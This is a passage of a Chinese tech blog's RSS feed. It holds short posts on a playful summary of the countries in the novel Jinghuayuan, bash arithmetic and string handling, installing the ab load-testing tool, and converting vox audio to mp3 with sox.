      <description>&lt;h1 id=&#34;五大单元&#34;&gt; 五大单元&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt; 输入单元&lt;/li&gt;
&lt;li&gt;CPU：算术，逻辑，内存&lt;/li&gt;
&lt;li&gt;输出单元&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;指令集&#34;&gt; 指令集&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt; 精简指令集&lt;/li&gt;
&lt;li&gt;福仔指令集&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>带你领略镜花缘中的神奇国度</title>
      <link>https://wdd.js.org/posts/2019/10/zfn92c/</link>
      <pubDate>Sun, 27 Oct 2019 19:43:44 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/10/zfn92c/</guid>
      <description>&lt;p&gt;《镜花缘》是清代李汝珍写的一部长篇小说，小说前半部分是主角游历海外各国的清代经历，有点像日本动漫海贼王。后半部分比较无趣，略过不提。&lt;/p&gt;
&lt;p&gt;单讲小说的前半部分，小说发生在唐代，主角叫做唐敖，本来科举中了探花，但是因为他和讨伐武则天的徐敬业有结拜之交，被人告发，遂革去了探花，降为秀才。&lt;/p&gt;
&lt;p&gt;唐敖心灰意冷，煮熟的鸭子就这么飞了。于是决定舍弃功名，游历山水。正好他的妹夫，林之洋是个跑远洋贸易的。&lt;/p&gt;
&lt;p&gt;唐敖正好搭上了妹夫的顺风船，环游世界之旅就这么开始了！！&lt;/p&gt;
&lt;h1 id=&#34;1-君子国&#34;&gt;1. 君子国&lt;/h1&gt;
&lt;p&gt;君子国讲究好让不正，惟善为宝。说的是这个国家的人啊，素质非常高，高到什么地步呢？高到有点反人类。&lt;/p&gt;
&lt;p&gt;下面的一个场景，是我从小说中简化的一个场景：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;买家说：老板，你的东西质量真好，价格却那么低，如果我买了去，我内心会不安的。跪求你抬高些价格，我才买，不然我就不买了。&lt;/p&gt;
&lt;p&gt;店铺老板说：我要的价格这么高，已经觉得过意不去了，如果你还让我涨价，还你还是去别的地方买东西吧。&lt;/p&gt;
&lt;p&gt;买家说：既然你不愿意涨价，那也行，我还按照这个价格买你的东西，但是我只拿一半东西走。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;是不是很反人类，从来只见过买家想要压低价格的，还未听说过买家想抬高价格的。&lt;/p&gt;
&lt;h1 id=&#34;2-大人国&#34;&gt;2. 大人国&lt;/h1&gt;
&lt;p&gt;此处的大人国，并不是说他们的身材巨大，而是形容他们国人的品格高大。他们都是争相做善事，不作恶事。&lt;/p&gt;
&lt;p&gt;除此以外，在他们的国家，很容易区分好人和坏人。他们所有的人脚下都踩着云。光明正大的人，脚下是彩云；经常做坏事的人，脚下是黑云。&lt;/p&gt;
&lt;p&gt;云的色彩会随着人的品行而变化，坏人如果能够向善，足下也会产生彩云。&lt;/p&gt;
&lt;p&gt;有些大官人，不希望别人看到他们脚下云的颜色，所以会用布裹上，但是这样做岂不是掩耳盗铃吗？&lt;/p&gt;
&lt;h1 id=&#34;3-黑齿国&#34;&gt; 3. 黑齿国&lt;/h1&gt;
&lt;p&gt;这个国家的人全身通黑，连牙齿都是黑的。我怀疑作者是不是去过非洲，但是非洲人的牙齿往往都是白色的。&lt;/p&gt;
&lt;p&gt;但是人不可貌相，黑齿国的人非常喜欢读书，个个都是满腹经纶。而且这个地方的小偷，只会偷书，却不偷金银宝物。&lt;/p&gt;
&lt;h1 id=&#34;4-劳民国&#34;&gt; 4. 劳民国&lt;/h1&gt;
&lt;p&gt;该国的人也是面色墨黑，走路都是摇摇晃晃，终日忙忙碌碌。但是呢，这个国家的人每个都是长寿。&lt;/p&gt;
&lt;h1 id=&#34;5-聂耳国&#34;&gt; 5. 聂耳国&lt;/h1&gt;
&lt;p&gt;聂耳国的耳朵很长，长耳及腰，走路都需要用手去捧着耳朵。更有甚者，耳朵及地。&lt;/p&gt;
&lt;p&gt;除了耳朵长的这个特点之外，有的人耳朵也特别大。据说可以一个耳朵当床垫，一个耳朵当棉被，睡在自己的耳朵里。&lt;/p&gt;
&lt;h1 id=&#34;6-无肠国&#34;&gt; 6. 无肠国&lt;/h1&gt;
&lt;p&gt;这个国家的人都没有肠子，无论吃喝什么东西，都会立即排出体外。所以他们在吃饭之前，都先找好厕所，不然就变成随地大小便了。&lt;/p&gt;
&lt;p&gt;更为恶心的是，因为他们吃的快也拉的快，很多食物都没有消化完全。所以有些人就把拉出来的便便收集起来，再给其他人吃。&lt;/p&gt;
&lt;h1 id=&#34;7-鬼国&#34;&gt; 7. 鬼国&lt;/h1&gt;
&lt;p&gt;国人夜晚不睡觉，颠倒白天黑夜，行为似鬼。&lt;/p&gt;
&lt;h1 id=&#34;8-毛民国&#34;&gt; 8. 毛民国&lt;/h1&gt;
&lt;p&gt;国人一身长毛，据说是上一世太为吝啬，一毛不拔。所以阎王让他下一世出生在毛民国，让他们满身长满毛。&lt;/p&gt;
&lt;h1 id=&#34;9-无继国&#34;&gt; 9. 无继国&lt;/h1&gt;
&lt;p&gt;国人从不生育，也没有孩子。而且他们也不区分男女。&lt;/p&gt;
&lt;p&gt;之所以他们国家的人口没有减少，是因为人死后120年之后还会再次复活。&lt;/p&gt;
&lt;p&gt;所以他们都是死了又活，活了有死。&lt;/p&gt;
&lt;h1 id=&#34;10-深目国&#34;&gt; 10. 深目国&lt;/h1&gt;
&lt;p&gt;他们脸上没有眼睛，他们的两个眼睛都长在自己的手掌里。是不是觉得似曾相识呢？火影里面的我爱罗。&lt;/p&gt;</description>
    </item>
    <item>
      <title>shell数学运算</title>
      <link>https://wdd.js.org/shell/match-eval/</link>
      <pubDate>Sat, 26 Oct 2019 14:18:08 +0800</pubDate>
      <guid>https://wdd.js.org/shell/match-eval/</guid>
      <description>&lt;p&gt;主要的数据运算方式&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;let&lt;/li&gt;
&lt;li&gt;(())&lt;/li&gt;
&lt;li&gt;[]&lt;/li&gt;
&lt;li&gt;expr&lt;/li&gt;
&lt;li&gt;bc&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;使用-let&#34;&gt;使用 let&lt;/h1&gt;
&lt;p&gt;使用 let 时，等号右边的变量不需要在加上$符号&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;#!/bin/bash

no1=1;
no2=2;
# 注意两个变量的值的类型实际上是字符串
re1=$no1+$no2 # 注意此时re1的值是1+2
let result=no1+no2 # 此时才是想获取的两数字的和，3
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>字符串操作</title>
      <link>https://wdd.js.org/shell/string-operator/</link>
      <pubDate>Sat, 26 Oct 2019 14:16:28 +0800</pubDate>
      <guid>https://wdd.js.org/shell/string-operator/</guid>
      <description>&lt;h1 id=&#34;获取字符串长度&#34;&gt;获取字符串长度&lt;/h1&gt;
&lt;p&gt;需要在变量前加个**#**&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;name=wdd
echo ${#name}
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;首尾去空格&#34;&gt;首尾去空格&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; abcd &amp;#34;&lt;/span&gt; | xargs
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;字符串包含&#34;&gt;字符串包含&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# $var是否包含字符串A&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[[&lt;/span&gt; $var &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;~ &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    echo
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# $var是否以字符串A开头&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[[&lt;/span&gt; $var &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;~ &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;^A&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    echo
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# $var是否以字符串A结尾&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[[&lt;/span&gt; $var &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;~ &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&lt;/span&gt;$&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    echo
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;字符串提取&#34;&gt;字符串提取&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;num1&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;test#*_&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;num2&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;num1#*_&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;surname&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;num2%_*&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;num4&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;test##*_&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;profession&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;num4%.*&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#*_ 从左边开始，去第一个符号“_”左边的所有字符&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;% _* 从右边开始，去掉第一个符号“_”右边的所有字符
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;##*_ 从右边开始，去掉第一个符号“_”左边的所有字符&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;%%_* 从左边开始，去掉第一个符号“_”右边的所有字符
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;判断某个字符串是否以特定字符开头&#34;&gt;判断某个字符串是否以特定字符开头&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[[&lt;/span&gt; $TAG &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;~ ABC* &lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	echo $TAG is begin with ABC
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>接口压力测试</title>
      <link>https://wdd.js.org/posts/2019/10/pbv6ok/</link>
      <pubDate>Fri, 25 Oct 2019 16:12:59 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/10/pbv6ok/</guid>
      <description>&lt;h1 id=&#34;ab安装&#34;&gt;ab安装&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;apt&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;install&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;apache2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;utils&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>vox语音转mp3</title>
      <link>https://wdd.js.org/posts/2019/10/nw4wmm/</link>
      <pubDate>Tue, 22 Oct 2019 16:44:31 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/10/nw4wmm/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apt&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;get&lt;/span&gt; install sox libsox&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;fmt&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;mp3 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;y
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sox &lt;span style=&#34;color:#66d9ef&#34;&gt;input&lt;/span&gt;.vox &lt;span style=&#34;color:#66d9ef&#34;&gt;output&lt;/span&gt;.mp3
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;sox支持命令&#34;&gt;sox支持命令&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;➜&lt;/span&gt;  vox sox &lt;span style=&#34;color:#75715e&#34;&gt;--help
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;sox:      SoX v14.&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;.&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Usage&lt;/span&gt; summary: [gopts] [[fopts] infile]... [fopts] outfile [effect [effopt]]...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SPECIAL FILENAMES (infile, outfile):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;                        Pipe&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;redirect &lt;span style=&#34;color:#66d9ef&#34;&gt;input&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;output&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;stdin&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;stdout&lt;/span&gt;); may need &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;t
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;d, &lt;span style=&#34;color:#75715e&#34;&gt;--default-device     Use the default audio device (where available)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;n, &lt;span style=&#34;color:#75715e&#34;&gt;--null               Use the `null&amp;#39; file handler; e.g. with synth effect
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;p, &lt;span style=&#34;color:#75715e&#34;&gt;--sox-pipe           Alias for `-t sox -&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SPECIAL FILENAMES (infile &lt;span style=&#34;color:#66d9ef&#34;&gt;only&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;|program [options] ...&amp;#34;&lt;/span&gt; Pipe &lt;span style=&#34;color:#66d9ef&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;external&lt;/span&gt; program (&lt;span style=&#34;color:#66d9ef&#34;&gt;where&lt;/span&gt; supported)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;http:&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;server&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;file       Use the given URL &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;input&lt;/span&gt; file (&lt;span style=&#34;color:#66d9ef&#34;&gt;where&lt;/span&gt; supported)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;GLOBAL&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;OPTIONS&lt;/span&gt; (gopts) (can be specified &lt;span style=&#34;color:#66d9ef&#34;&gt;at&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;any&lt;/span&gt; point &lt;span style=&#34;color:#66d9ef&#34;&gt;before&lt;/span&gt; the &lt;span style=&#34;color:#66d9ef&#34;&gt;first&lt;/span&gt; effect):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--buffer BYTES           Set the size of all processing buffers (default 8192)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--clobber                Don&amp;#39;t prompt to overwrite output file (default)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--combine concatenate    Concatenate all input files (default for sox, rec)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--combine sequence       Sequence all input files (default for play)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;D, &lt;span style=&#34;color:#75715e&#34;&gt;--no-dither          Don&amp;#39;t dither automatically
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--effects-file FILENAME  File containing effects and options
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;G&lt;/span&gt;, &lt;span style=&#34;color:#75715e&#34;&gt;--guard              Use temporary files to guard against clipping
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;h, &lt;span style=&#34;color:#75715e&#34;&gt;--help               Display version number and usage information
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--help-effect NAME       Show usage of effect NAME, or NAME=all for all
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--help-format NAME       Show info on format NAME, or NAME=all for all
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--i, --info              Behave as soxi(1)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--input-buffer BYTES     Override the input buffer size (default: as --buffer)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--no-clobber             Prompt to overwrite output file
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;m, &lt;span style=&#34;color:#75715e&#34;&gt;--combine mix        Mix multiple input files (instead of concatenating)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--combine mix-power      Mix to equal power (instead of concatenating)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;M, &lt;span style=&#34;color:#75715e&#34;&gt;--combine merge      Merge multiple input files (instead of concatenating)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--magic                  Use `magic&amp;#39; file-type detection
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--multi-threaded         Enable parallel effects channels processing
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--norm                   Guard (see --guard) &amp;amp; normalise
